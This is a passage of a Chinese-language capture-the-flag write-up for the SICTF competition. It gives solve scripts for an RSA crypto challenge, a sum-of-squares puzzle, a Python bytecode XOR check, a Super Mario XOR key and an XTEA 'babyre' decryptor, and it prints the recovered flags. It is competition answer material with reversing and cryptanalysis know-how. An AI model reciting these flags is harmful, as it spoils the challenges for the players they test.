47861485028284981615219874331354750385150254017244750993573994159458909546341067039268159319391512934162794663414200907868505060542602841564239761181077333990423542820064315891665379550720216448942932714180923613869070005330476506812100063599659432570925437054287120906048730323556681557905787470647037629769660028387819741611799183349496549168370221978146678987457271259655273299546276899538032070218474555442304430064164467753804089753466882786069297036926063093020795423414152340563079346797084488827259011515774643776620378827875819192074121522712821147817374988804339999134520633699074448564057555026364304855373068414955699295158212425760345481057281658337956841137897162198027254556350868502178340964817530029135654659162400076087528650997151875596189190736466304722028587441680622878918057024286243448077104494316372739218635221411755498456912672491099154558604384574583302548226057069534004474532514444674565766058970748694657151540644416463532338966570743112669782840065402131461088637463019996192189423665651801811614499041923273110971446683450048861113332787126098622974613883291506736280588039145040361795192519576202306796277888696719887642051327259799873478040156450250036778305950744573270786882726162630115640020293415918210448873867037875790399234972055537649774407094382744621251926131880807765203843946682834221238903263352845265134368550124026502981782369374484091775137498831749984649699756860976525160646445060537001</span><br>c = <span class="hljs-number">25311588269686177955448734593829241225577179988164713941852977611031657483354358211703127234256857543045931490595235462694154500286504335321863566904591526587164297277540588019404183750093303030110155964308233155625979213391426577001127732161793532171930032372311485789800839135378584125843945003217786635500780784536181313697728354510921343049319891609423580951127082479154042124088536642353812516362473763243425336498681024731131013712158320926550826023277898283823992258572884077276506953901984370413493389421701244517177275694290580595883324705204426546600360091062972293159479880268240701929584137714053692704173792703744319619320692061092061615202753943135058204637610994232168818081462863915909261100211958674543647005416235222620606212841753586419836448681445654681389951211124603287962397164672343026391101395393442103086256726266031275710666309840451443110824175976964355109239201609721120961810198879456321855222352235065257082872600438604687617267718725588993464084147695037610145634237788526691386358596867368523164061114195245860062033244276270480267737617206612775486335779851309426638789250166900931784751600508190450785806340839297468432626354823268011108399699249876358363866293469899572158837757748629586492339783888456600259136387616777593894789302431752391447333278000811521062096467397501227651566498970779080811188805992370970942403208432494393387894197176720244315639559895616799551357601688597541585709039366190088117378880414928532937085490713336140523926983900188378021593225550131993528275166272215028510435690944582596557549068715312515919059333916941744937308255671959764859162487792658274812322891679161915480098864709106347357292015949882243095564999283630289876842913558415205967734452657944991350268108202225952952066459093168792825684626405271617613362070897142103054139806566495183172335794957308822648116537830567396971238329939142829563169355194093529211071160078683833491919940022871862059981346961003867620542620578917684687869682550269127226291011607064545739386850054846167307744022708831833252517778607796258598290908139274345221343651583618249287308738279011682960787460189183445095638164116734700624496711487227176740828397696295620232796356005136058517828311139839381424066302086111930635998143063033446131859852797958765199173807715541045956108285596958780742834805533223538366354327087736088500599094358107164689423572964793385788194218918919596478862097292477628426360333874314260108133339375942666508606311391805252966277961758108821946154428477616100004321457604879220523742427633323872953699931521980332026241531049474031438142792394628576016121322036294740176980189940853036679375845577017978783071015970829136676221389585848058189544793760570196797629432282672371000290840492119720433350192833648839794730598188620374416865232426658538841900897108162173580739323675324880778494924038982358349531848197090990541020708295116156624389135273650491811601011636903928586011504526431498652011548693157985029456398851189821020778958527809174433156243544030624341915713810661287037659586018768085470670240790942171506843637271442721823608266490364627429331023698199955218456371716269004979764982383921294842864121196124699402037204598504310969390789092001114319822852242500941141355281693725110460506548426263105213498404197519606615831672853931646583757742145492562101250546593997874586076926641241047317510838024042147508770595175718146175716833867781581245298658392175502069483979736336330731124942036757071709086638075284655589787868565023763734664219353940143820183318534640360506287779208468427268377183973501528333749816003855834863565394122448191029578528511650194632623989208637401008114422451686312319644054514944700566430912835340518601698767128195833704182657730566589247891277627101027106635732998136735398078858899384713118593668984773592904704131402905145754570091966901120411201405256435232063295790833161132002246279663161388421997242226907126829858922174709653627696146355472690262198127338971112610753839661677080463775112411884196230185877234066728564716929551607129141735155379529048300204700285511666205204686244751557147684338591300111406075976759988295937870045743031816067994768915303111125253664865369863586807234945352445045026501495849671447691502253489642657652848949102823407762108943161789244134119866441040670840037015617307056821150285453994199024947457774647253618512995677313792036106100497936654142008173389260345411854520383366800831542339243757421033121103167943520915885043698882609693007629591093225819727653240183003450339802857059736870645197609170799838610316307123146927966669912638227587517396282910946355194781275415343491170583392480153599086125374051844306869510079152461763122622668280249192047024784624692776244265874153473114993619019113474166958126841368545758693832786756946298833891033171752534079387364641021835311861509609494125593285947444939996542402774020507531158198766149282993994638607458820211163623309687149807339960007614766879688676462400606899851539023671152038536934433128973358637812907001112093086713949701646964777013925616637956114825918525229968119306607256312727518429074253193934915609865400118400124334806320033990630595454381780378123232633134565408152216410478497582716891919477755736223636583493709691482948793995974775520709337409910573358960632077245564017495103173982250506224927848890977671698731337737945862469303397352291579706358090437359126171980555387033997507170208063868788685780633727495158542911276981383764698030088894904043298340184342818716278091407356551940358010532738356144600648671870141201656260882560550096111259047730234565173017875969390130055742832375612379167064701421263006004472414998830886590121784525812803198481744263349186310137594023961272959521982892804372412802448375074058059953851751721276448647238818757245128139844126234490887064897176175605991477364838775902549049484485649550475857257115219540606931472558004890564503134870490140656624241401747198540715275804941032074573356860460172868340373583692584902872979221114982298050586685719887060873413850621645519128954022253850929825608263273096476942591333367968509790925478388960974334157155990587259664085903377635645971389261554405014491809856113962072321115329323751880850245450855429733690986687462514539793256111238991830404264833945950057548041347552265351912075406068254301589527368376552057750656888595867048015012255350060023438752477068307445956245683183096512267217891149812719686622381240260466772552889788641876064057960173837664029586196731436456574414559972320705400861271592462379875676277251086312872195716024719468847393778892154498344296554136868868732950910162390521996660833516010868267341539744299603050842530651780425947531816479566426165422123252285427076862067553260240357395991463485011778125635347076641337205162163658915958257879189951068432591492287483129944125287963913713736174143726754563437013760958618334477377727596918588685928884428267449422751775309153821164066157157127578931430789782791432466972743083256930846560916380022935439074194208587413499830348721004306047843916090382879427208653946874404416581482497419737465638158237340330822703573665318917667360471294611610224794247546701801044290825387969994925735165223021550294577211312086169077389985367351707099712483698243658870007261177946508698830792080087400145468466457013023648585707831661968993789151545051681008263293021078693138432668411562842904645661356499891588207831214182852485507569391094080770281546830762172075737108196782354642073491890672014845707320966391491467609280627047834838773416130380735074488364271149543425149101272213833983451690912775914099688310078028317868139895586469648241691434390559738020665790535748911667198341478329818172050103593169144077713081858968945277802911631514524770516773987691162846774892828407010262766598402873965272708201519043339930474621748065360132998861911090097210247744181877811558047691563490093112810880988416880859363631693862441291401344868362517958157134815632633152101164792211199872770004214575342556751954753067436057216989105115974894826691301734658752554796336087163153087013755182247902851847839867807219615044427616326518986674768302109569955218389569458769985874451273117138435546665024826358058600551523916808015505037962468350942106702503883112975634757971636535249998962164886704286732345711210362931312187319836001555348202695806282730945501510756659164231139623277954192087899140537284122009070763979073048837471984618684020674370221463294306239424220412900401460550783283591789801735401367473630854684306273273881688896021682911944793729874921181848098382943970467341811398482121657330781393699096796050290808604481724879698091852697163383826854575487201365106673196811573729247280577781500366763330567122007588833805912087009446499739562463428568952248234506507069953596589309728265145195922268165106056450388840269349409588020300011340940321969965833519126936472969929255823540027083032424724503173052044192907375974391257436211908641463947719594493311129179150043015816776680636855703407557636501711566215605658114055289137679940955</span><br>e = <span class="hljs-number">19458216662993202562182929756256684791318810848802754020883513588583377528821730559897870095442161189229950925325157413999927847684731484753811988111830295294129447423655650029218971567158117911790213848402209470536199246476182240248742771389082526603384625792117047996128232952372477895218147279573573322975526303267821446640338606290250958710008158544852602338088244940388562828263436457418528981476220691508040085291576643321726669065360399003917048894093458055139757991688086912143763420958307099065105543361779847689716282373299487102518794317683805758527645283956734672229827240143254092779918701447288342107763</span><br><br>np = (<span class="hljs-number">8</span>**<span class="hljs-number">16</span>)*(<span class="hljs-number">128</span>**<span class="hljs-number">32</span>)*(<span class="hljs-number">4096</span>**<span class="hljs-number">2</span>)<br>p = gmpy2.<span class="hljs-title function_ invoke__">iroot</span>(n//np,<span class="hljs-number">58</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">while</span> True:<br>    p = <span class="hljs-title function_ invoke__">prevprime</span>(p)<br>    d = gmpy2.<span class="hljs-title function_ invoke__">invert</span>(e,p-<span class="hljs-number">1</span>)<br>    m = <span class="hljs-title function_ invoke__">pow</span>(c,d,p)<br>    flag = <span class="hljs-title function_ invoke__">long_to_bytes</span>(m)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;SICTF&#123;&quot;</span> in flag:<br>        <span class="hljs-keyword">print</span>(flag)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-comment">#SICTF&#123;6ee93ffd-e903-49d6-b166-44680a294851&#125;</span><br></code></pre></td></tr></table></figure><h4 id="xy"><a href="#xy" class="headerlink" title="xy"></a>xy</h4><p>解方程平方和，sage上的函数 two_squares() 可以求出x,y</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#sage</span><br>enc = <br>x_y= <span class="hljs-title function_ invoke__">two_squares</span>(enc)<br><span class="hljs-keyword">print</span>(x_y)<br></code></pre></td></tr></table></figure><p>不会写交互，手撸<br><img src="/mdimg/sictf/37.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h4 id="LiHua’s-checkme"><a href="#LiHua’s-checkme" class="headerlink" title="LiHua’s checkme"></a>LiHua’s checkme</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>           <span class="hljs-number">0</span> LOAD_CONST               <span class="hljs-number">0</span> (<span class="hljs-number">114433</span>)<br>            <span class="hljs-number">2</span> LOAD_CONST               <span class="hljs-number">1</span> (<span class="hljs-number">114459</span>)<br>            <span class="hljs-number">4</span> LOAD_CONST               <span class="hljs-number">2</span> (<span class="hljs-number">114449</span>)<br>            <span class="hljs-number">6</span> LOAD_CONST               <span class="hljs-number">3</span> (<span class="hljs-number">114438</span>)<br>            <span class="hljs-number">8</span> LOAD_CONST               <span class="hljs-number">4</span> (<span class="hljs-number">114452</span>)<br>           <span class="hljs-number">10</span> LOAD_CONST               <span class="hljs-number">5</span> (<span class="hljs-number">114473</span>)<br>           <span class="hljs-number">12</span> LOAD_CONST               <span class="hljs-number">6</span> (<span class="hljs-number">114480</span>)<br>           <span class="hljs-number">14</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">16</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">18</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">20</span> LOAD_CONST              <span class="hljs-number">10</span> (<span class="hljs-number">114528</span>)<br>           <span class="hljs-number">22</span> LOAD_CONST              <span class="hljs-number">11</span> (<span class="hljs-number">114483</span>)<br>           <span class="hljs-number">24</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">26</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">28</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">30</span> LOAD_CONST               <span class="hljs-number">7</span> (<span class="hljs-number">114530</span>)<br>           <span class="hljs-number">32</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">34</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">36</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">38</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">40</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">42</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">44</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">46</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">48</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">50</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">52</span> LOAD_CONST              <span class="hljs-number">12</span> (<span class="hljs-number">114484</span>)<br>           <span class="hljs-number">54</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">56</span> LOAD_CONST              <span class="hljs-number">19</span> (<span class="hljs-number">114535</span>)<br>           <span class="hljs-number">58</span> LOAD_CONST              <span class="hljs-number">13</span> (<span class="hljs-number">114559</span>)<br>           <span class="hljs-number">60</span> LOAD_CONST              <span class="hljs-number">20</span> (<span class="hljs-number">114533</span>)<br>           <span class="hljs-number">62</span> LOAD_CONST               <span class="hljs-number">9</span> (<span class="hljs-number">114487</span>)<br>           <span class="hljs-number">64</span> LOAD_CONST              <span class="hljs-number">21</span> (<span class="hljs-number">114529</span>)<br>           <span class="hljs-number">66</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">68</span> LOAD_CONST              <span class="hljs-number">18</span> (<span class="hljs-number">114538</span>)<br>           <span class="hljs-number">70</span> LOAD_CONST              <span class="hljs-number">16</span> (<span class="hljs-number">114486</span>)<br>           <span class="hljs-number">72</span> LOAD_CONST              <span class="hljs-number">15</span> (<span class="hljs-number">114532</span>)<br>           <span class="hljs-number">74</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">76</span> LOAD_CONST              <span class="hljs-number">17</span> (<span class="hljs-number">114534</span>)<br>           <span class="hljs-number">78</span> LOAD_CONST              <span class="hljs-number">14</span> (<span class="hljs-number">114539</span>)<br>           <span class="hljs-number">80</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">82</span> LOAD_CONST               <span class="hljs-number">8</span> (<span class="hljs-number">114531</span>)<br>           <span class="hljs-number">84</span> LOAD_CONST              <span class="hljs-number">22</span> (<span class="hljs-number">114479</span>)<br>           <span class="hljs-number">86</span> BUILD_LIST              <span class="hljs-number">43</span><br>           <span class="hljs-number">88</span> STORE_NAME               <span class="hljs-number">0</span> (flags)<br><br><span class="hljs-number">2</span>          <span class="hljs-number">90</span> LOAD_NAME                <span class="hljs-number">1</span> (<span class="hljs-built_in">input</span>)<br>           <span class="hljs-number">92</span> CALL_FUNCTION            <span class="hljs-number">0</span><br>           <span class="hljs-number">94</span> STORE_NAME               <span class="hljs-number">2</span> (flag)<br><br><span class="hljs-number">3</span>          <span class="hljs-number">96</span> LOAD_CONST              <span class="hljs-number">23</span> (<span class="hljs-number">0</span>)<br>           <span class="hljs-number">98</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br><br><span class="hljs-number">4</span>         <span class="hljs-number">100</span> SETUP_LOOP              <span class="hljs-number">52</span> (to <span class="hljs-number">154</span>)<br>          <span class="hljs-number">102</span> LOAD_NAME                <span class="hljs-number">4</span> (<span class="hljs-built_in">range</span>)<br>          <span class="hljs-number">104</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">106</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">108</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">110</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">112</span> GET_ITER<br>      &gt;&gt;  <span class="hljs-number">114</span> FOR_ITER                <span class="hljs-number">36</span> (to <span class="hljs-number">152</span>)<br>          <span class="hljs-number">116</span> STORE_NAME               <span class="hljs-number">6</span> (i)<br><br><span class="hljs-number">5</span>         <span class="hljs-number">118</span> LOAD_NAME                <span class="hljs-number">7</span> (<span class="hljs-built_in">ord</span>)<br>          <span class="hljs-number">120</span> LOAD_NAME                <span class="hljs-number">2</span> (flag)<br>          <span class="hljs-number">122</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">124</span> BINARY_SUBSCR<br>          <span class="hljs-number">126</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">128</span> LOAD_CONST              <span class="hljs-number">24</span> (<span class="hljs-number">114514</span>)<br>          <span class="hljs-number">130</span> BINARY_XOR<br>          <span class="hljs-number">132</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">134</span> LOAD_NAME                <span class="hljs-number">6</span> (i)<br>          <span class="hljs-number">136</span> BINARY_SUBSCR<br>          <span class="hljs-number">138</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">140</span> POP_JUMP_IF_FALSE      <span class="hljs-number">114</span><br><br><span class="hljs-number">6</span>         <span class="hljs-number">142</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">144</span> LOAD_CONST              <span class="hljs-number">25</span> (<span class="hljs-number">1</span>)<br>          <span class="hljs-number">146</span> INPLACE_ADD<br>          <span class="hljs-number">148</span> STORE_NAME               <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">150</span> JUMP_ABSOLUTE          <span class="hljs-number">114</span><br>      &gt;&gt;  <span class="hljs-number">152</span> POP_BLOCK<br><br><span class="hljs-number">7</span>     &gt;&gt;  <span class="hljs-number">154</span> LOAD_NAME                <span class="hljs-number">3</span> (true)<br>          <span class="hljs-number">156</span> LOAD_NAME                <span class="hljs-number">5</span> (<span class="hljs-built_in">len</span>)<br>          <span class="hljs-number">158</span> LOAD_NAME                <span class="hljs-number">0</span> (flags)<br>          <span class="hljs-number">160</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">162</span> COMPARE_OP               <span class="hljs-number">2</span> (==)<br>          <span class="hljs-number">164</span> POP_JUMP_IF_FALSE      <span class="hljs-number">174</span><br><br><span class="hljs-number">8</span>         <span class="hljs-number">166</span> LOAD_NAME                <span class="hljs-number">8</span> (<span class="hljs-built_in">print</span>)<br>          <span class="hljs-number">168</span> LOAD_CONST              <span class="hljs-number">26</span> (<span class="hljs-string">&#x27;True!&#x27;</span>)<br>          <span class="hljs-number">170</span> CALL_FUNCTION            <span class="hljs-number">1</span><br>          <span class="hljs-number">172</span> POP_TOP<br>      &gt;&gt;  <span class="hljs-number">174</span> LOAD_CONST              <span class="hljs-number">27</span> (<span class="hljs-literal">None</span>)<br>          <span class="hljs-number">176</span> RETURN_VALUE<br></code></pre></td></tr></table></figure><blockquote><p>根据字节码还原python脚本 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">flags = [<span class="hljs-number">114433</span>, <span class="hljs-number">114459</span>, <span class="hljs-number">114449</span>, <span class="hljs-number">114438</span>, <span class="hljs-number">114452</span>, <span class="hljs-number">114473</span>, <span class="hljs-number">114480</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114528</span>, <span class="hljs-number">114483</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114530</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114484</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114535</span>, <span class="hljs-number">114559</span>, <span class="hljs-number">114533</span>, <span class="hljs-number">114487</span>, <span class="hljs-number">114529</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114538</span>, <span class="hljs-number">114486</span>, <span class="hljs-number">114532</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114534</span>, <span class="hljs-number">114539</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114531</span>, <span class="hljs-number">114479</span>]<br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flags:<br>    flag += <span class="hljs-built_in">chr</span>(i^<span class="hljs-number">114514</span>)<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#SICTF&#123;b01e2a1f-096d-4fd8-8f95-7e388d694911&#125;</span><br></code></pre></td></tr></table></figure><h4 id="Super-Mario-Bros"><a href="#Super-Mario-Bros" class="headerlink" title="Super Mario Bros"></a>Super Mario Bros</h4><p>原项目：<a href="https://github.com/heart6622/python_SuperMario">https://github.com/heart6622/python_SuperMario</a><br>用python3.10正确反编译<br>题目提示源码在./source目录下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> pwn import <span class="hljs-keyword">xor</span><br>s=[<span class="hljs-number">10</span>, <span class="hljs-number">9</span>, <span class="hljs-number">23</span>, <span class="hljs-number">2</span>, <span class="hljs-number">23</span>, <span class="hljs-number">109</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">58</span>, <span class="hljs-number">71</span>, <span class="hljs-number">22</span>, <span class="hljs-number">51</span>, <span class="hljs-number">82</span>, <span class="hljs-number">93</span>, <span class="hljs-number">20</span>, <span class="hljs-number">92</span>, <span class="hljs-number">93</span>, <span class="hljs-number">28</span>, <span class="hljs-number">41</span>, <span class="hljs-number">3</span>, <span class="hljs-number">25</span>, <span class="hljs-number">78</span>, <span class="hljs-number">0</span>, <span class="hljs-number">44</span>, <span class="hljs-number">16</span>]<br>key= <span class="hljs-string">&#x27;level num&#x27;</span><br><span class="hljs-keyword">print</span> (<span class="hljs-keyword">xor</span>(s,key))<br></code></pre></td></tr></table></figure><h4 id="babyre"><a href="#babyre" class="headerlink" title="babyre"></a>babyre</h4><p>xtea    算法<br>re✌的exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decipher</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> num_rounds, <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>], <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>        <span class="hljs-type">uint32_t</span>  delta = <span class="hljs-number">0x61C88647</span>, sum = delta * num_rounds;<br>        <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">2</span> * j], v1 = v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; num_rounds; i++) &#123;<br><br>            v1 -= ((((v0 * <span class="hljs-number">8</span>) ^ (v0 &gt;&gt; <span class="hljs-number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="hljs-number">11</span>) &amp; <span class="hljs-number">3</span>])) ^ <span class="hljs-number">3</span>;<br>            sum -= delta;<br>            v0 -= (((v1 * <span class="hljs-number">8</span>) ^ (v1 &gt;&gt; <span class="hljs-number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="hljs-number">3</span>]);<br>        &#125;<br><br>        v[<span class="hljs-number">2</span> * j] = v0; v[<span class="hljs-number">2</span> * j + <span class="hljs-number">1</span>] = v1;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">6</span>] = &#123; <span class="hljs-number">0xab603776</span>,<span class="hljs-number">0xb9b07148</span>,<span class="hljs-number">0xbff5ec79</span>,<span class="hljs-number">0x4e93cb5e</span>,<span class="hljs-number">0xcbb3b436</span>,<span class="hljs-number">0x41d24b4d</span> &#125;;<br>    <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> k[<span class="hljs-number">4</span>] = &#123; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x12345678</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x23456789</span>,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x34567890</span> ,(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-number">0x45678901</span> &#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r = <span class="hljs-number">32</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加密的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    decipher(r, v, k);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;解密后的数据：0x%x,0x%x,0x%x,0x%x,0x%x,0x%x\n&quot;</span>, v[<span class="hljs-number">0</span>], v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>], v[<span class="hljs-number">4</span>], v[<span class="hljs-number">5</span>]);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">3</span>; j &gt;= <span class="hljs-number">0</span>; j--)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, (v[i] 